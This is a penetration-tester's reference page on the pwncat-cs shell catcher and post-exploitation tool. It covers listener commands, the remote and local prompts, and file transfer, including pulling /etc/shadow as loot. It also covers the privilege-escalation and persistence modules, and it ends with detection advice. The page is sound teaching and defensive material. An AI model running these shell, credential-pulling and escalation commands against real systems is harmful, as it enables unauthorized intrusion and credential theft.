# pwncat

A reverse/bind shell **catcher and post-exploitation platform** — think `nc -lvnp` that, the moment a shell lands, auto-stabilises it into a full TTY, survives disconnects, and adds file transfer, privesc enumeration and persistence from a local prompt.

This note covers **pwncat-cs** (the maintained [calebstewart](https://github.com/calebstewart/pwncat) rewrite). The original `cytopia/pwncat` is an unrelated netcat clone — different tool, don't confuse them.

> Authorized testing only. The persistence and privesc modules change the target; confirm scope before using them, and record anything installed in your engagement `tools.txt`.

## Contents

- [Install](#install)
- [Catch a shell](#catch-a-shell)
- [The two prompts — remote vs local](#the-two-prompts--remote-vs-local)
- [Files](#files)
- [Modules — enum, privesc, persistence](#modules--enum-privesc-persistence)
- [pwncat vs netcat](#pwncat-vs-netcat)
- [Defense / detection](#defense--detection)
- [Related](#related)

## Install

Needs **Python 3.9+** on Linux. Use pipx so it's isolated:

```bash
pipx install pwncat-cs
# or:  pip install pwncat-cs
```

The command is **`pwncat-cs`** (not `pwncat` — that name belongs to the other project).

## Catch a shell

```bash
pwncat-cs -lp 4444                        # listen for a reverse shell on 4444
pwncat-cs bind://0.0.0.0:4444             # same, explicit form
pwncat-cs connect://10.10.10.10:4444      # connect TO a bind shell on the target
pwncat-cs 10.10.10.10:4444                # shorthand for connect://
pwncat-cs -lp 4444 --ssl                  # TLS-wrapped listener
```

Run any [reverse shell one-liner](shell.md#reverse-shell-one-liners) on the target pointed at `-lp 4444`. On connect, pwncat fingerprints the host and **stabilises the TTY for you** — no manual `python3 -c 'pty.spawn(...)'` / `stty raw -echo` dance.

## The two prompts — remote vs local

pwncat has two modes and you toggle between them with **`Ctrl-D`**:

| Mode | Prompt | You're talking to |
| --- | --- | --- |
| **Remote** | the target's shell | the compromised host — run normal commands |
| **Local** | `(local) pwncat$` | pwncat itself — run its modules |

- **`Ctrl-D`** — toggle remote ⇄ local. pwncat intercepts it rather than passing it to the target.
- **`Ctrl-K` then `Ctrl-D`** — send a real `Ctrl-D` (EOF) through to the target instead of toggling.

So: land the shell → you're in **remote** → press `Ctrl-D` → you're at the **local** `pwncat$` prompt to run modules → `Ctrl-D` again to go back.

## Files

From the local `pwncat$` prompt:

```bash
upload   /local/linpeas.sh  /tmp/linpeas.sh      # push a tool to the target
download /etc/shadow        ./loot/shadow         # pull loot back
```

No separate web server or second nc needed — the file channel rides the existing session.

## Modules — enum, privesc, persistence

Driven like other post-ex frameworks, from the local prompt: `search`, `info`, `use`, `run`.

```bash
# enumeration
run enumerate                               # everything pwncat can find
run enumerate.gather -t system,network      # only certain facts

# privilege escalation
search escalate                             # list escalation modules
run escalate.list                           # what looks exploitable here
escalate                                    # attempt to get root automatically

# persistence (scope-sensitive — get sign-off, then log it)
search persist
run persist.gather                          # what's installed
```

`escalate` chaining is the headline feature: pwncat enumerates SUID, sudo, capabilities, etc., and will attempt to walk a path to root on its own. Treat its findings the way you'd treat any automated result — confirm the actual misconfig against the [Linux Privilege Escalation](../Linux/Privilege%20Escalation.md) note before it goes in the report.

## pwncat vs netcat

| | [netcat](netcat.md) | pwncat |
| --- | --- | --- |
| Catch a shell | Yes | Yes |
| Auto-stabilise TTY | No (manual) | **Automatic** |
| Survives disconnect | No | **Reconnects / persists** |
| File transfer | Manual, second channel | **Built-in `upload`/`download`** |
| Privesc / persistence | No | **Modules** |
| On every box already | Usually | No — you install it on **your** box |
| Footprint | Tiny | Larger, noisier |

Rule of thumb: **netcat to catch quickly and move on; pwncat when you're settling in** on a Linux target and want stabilisation, looting and privesc in one place. For Windows, pwncat is Linux-focused — use `evil-winrm` or a Meterpreter handler instead ([Remote Access](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md), [Metasploit](../Tools/Metasploit.md)).

## Defense / detection

- Same callback signature as any reverse shell ([netcat → Defense](netcat.md#defense--detection)) — outbound to an odd port from a service account.
- pwncat's **persistence** modules are what to hunt after an incident: added SSH `authorized_keys`, new users, altered systemd units, PAM backdoors, cron entries. Its privesc attempts leave the usual traces (SUID abuse, sudo misuse) in auth logs.
- TTY stabilisation spawns a `pty`/`bash -i` — a web or DB account suddenly owning an interactive pty is a strong signal.
- See [Host-based logging on Linux](../../Defense/Logging/Host-based/Linux.md) and [1. Linux Hardening](../../Defense/System%20and%20Services%20Hardening/1.%20Linux%20Hardening.md).

## Related

[shell](shell.md) · [netcat](netcat.md) · [Linux Privilege Escalation](../Linux/Privilege%20Escalation.md) · [Linux Overview](../Linux/Linux%20Overview.md) · [Remote Access & Getting a Shell](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md) · [Metasploit](../Tools/Metasploit.md) · [revshells.com](https://www.revshells.com)
